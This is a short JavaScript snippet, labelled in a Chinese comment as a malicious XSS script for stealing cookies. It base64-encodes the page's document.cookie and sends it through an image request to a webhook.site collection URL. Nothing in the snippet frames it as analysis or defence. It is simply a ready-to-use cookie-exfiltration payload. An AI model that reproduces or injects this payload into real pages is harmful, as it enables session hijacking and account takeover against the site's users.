// 惡意 script，用於 XSS 偷 cookie
(() => {
  const payload = btoa(document.cookie);
  new Image().src =
    "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?c=" + payload;
})();
